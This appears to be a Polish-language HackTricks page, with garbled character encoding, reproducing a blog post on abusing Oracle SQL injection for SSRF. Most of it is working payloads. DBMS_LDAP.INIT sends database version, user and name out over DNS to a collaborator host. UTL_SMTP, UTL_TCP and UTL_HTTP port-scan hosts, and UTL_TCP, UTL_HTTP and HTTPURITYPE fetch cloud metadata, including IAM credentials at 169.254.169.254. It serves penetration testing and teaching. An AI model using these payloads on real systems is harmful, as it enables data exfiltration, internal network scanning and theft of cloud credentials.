# Wstrzykiwanie Oracle

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Podaj ten post jako kopiÄ™ usuniÄ™tego postu z [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**.

## SSRF

UÅ¼ywanie Oracle do wykonywania Å¼Ä…daÅ„ HTTP i DNS poza pasmem jest dobrze udokumentowane, ale jako sposÃ³b na wyciek danych SQL w wstrzykiwaniu. Zawsze moÅ¼emy zmodyfikowaÄ‡ te techniki/funkcje, aby wykonywaÄ‡ inne ataki SSRF/XSPA.

Instalacja Oracle moÅ¼e byÄ‡ bardzo bolesna, zwÅ‚aszcza jeÅ›li chcesz szybko skonfigurowaÄ‡ instancjÄ™ do wyprÃ³bowania poleceÅ„. MÃ³j przyjaciel i kolega z [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), poleciÅ‚ mi [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c), co pozwoliÅ‚o mi skonfigurowaÄ‡ instancjÄ™ na maszynie Ubuntu AWS t2.large za pomocÄ… Dockera.

UruchomiÅ‚em polecenie docker z flagÄ… `--network="host"`, aby mÃ³c udawaÄ‡ Oracle jako natywnÄ… instalacjÄ™ z peÅ‚nym dostÄ™pem do sieci, na potrzeby tego wpisu na blogu.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Pakiety Oracle obsÅ‚ugujÄ…ce specyfikacjÄ™ URL lub nazwÄ™ hosta/numer portu <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Aby znaleÅºÄ‡ jakiekolwiek pakiety i funkcje obsÅ‚ugujÄ…ce specyfikacjÄ™ hosta i numeru portu, przeprowadziÅ‚em wyszukiwanie w [Dokumentacji online bazy danych Oracle](https://docs.oracle.com/database/121/index.html). Konkretnie,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
Wyniki wyszukiwania zwrÃ³ciÅ‚y nastÄ™pujÄ…ce rezultaty (nie wszystkie moÅ¼na wykorzystaÄ‡ do wykonywania sieciowych Å¼Ä…daÅ„ wychodzÄ…cych):

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Ta prymitywna metoda wyszukiwania oczywiÅ›cie pomija pakiety takie jak `DBMS_LDAP` (ktÃ³re umoÅ¼liwiajÄ… przekazywanie nazwy hosta i numeru portu), poniewaÅ¼ [strona dokumentacji](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) po prostu przekierowuje do [innego miejsca](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Dlatego istniejÄ… inne pakiety Oracle, ktÃ³re mogÄ… byÄ‡ wykorzystane do wykonywania Å¼Ä…daÅ„ wychodzÄ…cych, ktÃ³re mogÅ‚em przeoczyÄ‡.

W kaÅ¼dym przypadku, przyjrzyjmy siÄ™ niektÃ³rym z pakietÃ³w, ktÃ³re odkryliÅ›my i wymieniliÅ›my powyÅ¼ej.

**DBMS\_LDAP.INIT**

Pakiet `DBMS_LDAP` umoÅ¼liwia dostÄ™p do danych z serwerÃ³w LDAP. Funkcja `init()` inicjalizuje sesjÄ™ z serwerem LDAP i przyjmuje nazwÄ™ hosta i numer portu jako argument.

Ta funkcja zostaÅ‚a juÅ¼ udokumentowana w celu pokazania wycieku danych za pomocÄ… DNS, jak poniÅ¼ej
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
JednakÅ¼e, biorÄ…c pod uwagÄ™, Å¼e funkcja akceptuje argumenty w postaci nazwy hosta i numeru portu, moÅ¼na jej rÃ³wnieÅ¼ uÅ¼yÄ‡ jako skanera portÃ³w.

Oto kilka przykÅ‚adÃ³w:
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
BÅ‚Ä…d `ORA-31203: DBMS_LDAP: PL/SQL - Inicjalizacja nie powiodÅ‚a siÄ™.` oznacza, Å¼e port jest zamkniÄ™ty, podczas gdy wartoÅ›Ä‡ sesji wskazuje na otwarty port.

**UTL\_SMTP**

Pakiet `UTL_SMTP` jest przeznaczony do wysyÅ‚ania wiadomoÅ›ci e-mail za pomocÄ… protokoÅ‚u SMTP. PrzykÅ‚ad dostarczony na [stronie dokumentacji Oracle](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478) pokazuje, jak moÅ¼na uÅ¼yÄ‡ tego pakietu do wysyÅ‚ania wiadomoÅ›ci e-mail. Dla nas jednak interesujÄ…ce jest moÅ¼liwoÅ›Ä‡ podania hosta i portu.

PoniÅ¼ej przedstawiono przykÅ‚ad z uÅ¼yciem funkcji `UTL_SMTP.OPEN_CONNECTION` z timeoutem 2 sekundy.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout` oznacza, Å¼e port jest otwarty, ale nie ustanowiono poÅ‚Ä…czenia SMTP, podczas gdy `ORA-29278: SMTP transient error: 421 Service not available` oznacza, Å¼e port jest zamkniÄ™ty.

**UTL\_TCP**

Pakiet `UTL_TCP` oraz jego procedury i funkcje umoÅ¼liwiajÄ… komunikacjÄ™ opartÄ… na protokole TCP/IP z usÅ‚ugami. JeÅ›li zostanie zaprogramowany dla konkretnej usÅ‚ugi, ten pakiet moÅ¼e staÄ‡ siÄ™ Å‚atwym sposobem na dostanie siÄ™ do sieci lub wykonywanie peÅ‚nych Å¼Ä…daÅ„ po stronie serwera, poniewaÅ¼ moÅ¼na kontrolowaÄ‡ wszystkie aspekty poÅ‚Ä…czenia TCP/IP.

PrzykÅ‚ad na stronie dokumentacji Oracle pokazuje, jak moÅ¼na uÅ¼yÄ‡ tego pakietu do nawiÄ…zania surowego poÅ‚Ä…czenia TCP w celu pobrania strony internetowej. MoÅ¼emy to jeszcze bardziej uproÅ›ciÄ‡ i uÅ¼yÄ‡ go do wysyÅ‚ania Å¼Ä…daÅ„ do instancji metadanych na przykÅ‚ad lub do dowolnej usÅ‚ugi TCP/IP.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
InteresujÄ…co, dziÄ™ki moÅ¼liwoÅ›ci tworzenia surowych Å¼Ä…daÅ„ TCP, ten pakiet moÅ¼e rÃ³wnieÅ¼ byÄ‡ uÅ¼ywany do zapytania usÅ‚ugi metadanych instancji wszystkich dostawcÃ³w chmury, poniewaÅ¼ typ metody i dodatkowe nagÅ‚Ã³wki mogÄ… byÄ‡ przekazywane w Å¼Ä…daniu TCP.

**UTL\_HTTP i Å¼Ä…dania sieciowe**

Najbardziej powszechnÄ… i szeroko udokumentowanÄ… technikÄ… w kaÅ¼dym samouczku dotyczÄ…cym Oracle SQL Injection jest pakiet [`UTL_HTTP`](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070). Ten pakiet jest zdefiniowany w dokumentacji jako - `Pakiet UTL_HTTP umoÅ¼liwia wywoÅ‚ywanie protokoÅ‚u HTTP (Hypertext Transfer Protocol) z poziomu SQL i PL/SQL. MoÅ¼na go uÅ¼ywaÄ‡ do dostÄ™pu do danych w Internecie za poÅ›rednictwem protokoÅ‚u HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
MoÅ¼esz dodatkowo uÅ¼yÄ‡ tego do wykonania podstawowego skanowania portÃ³w za pomocÄ… zapytaÅ„ takich jak:
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
BÅ‚Ä…d `ORA-12541: TNS:no listener` lub `TNS:operation timed out` oznacza, Å¼e port TCP jest zamkniÄ™ty, podczas gdy bÅ‚Ä…d `ORA-29263: HTTP protocol error` lub dane sÄ… oznakÄ… otwartego portu.

Innym pakietem, ktÃ³ry uÅ¼ywaÅ‚em w przeszÅ‚oÅ›ci z rÃ³Å¼nymi sukcesami, jest [`GETCLOB()` metoda abstrakcyjnego typu Oracle `HTTPURITYPE`](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705), ktÃ³ra umoÅ¼liwia interakcjÄ™ z adresem URL i obsÅ‚uguje protokÃ³Å‚ HTTP. Metoda `GETCLOB()` sÅ‚uÅ¼y do pobierania odpowiedzi GET z adresu URL jako [typ danych CLOB](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
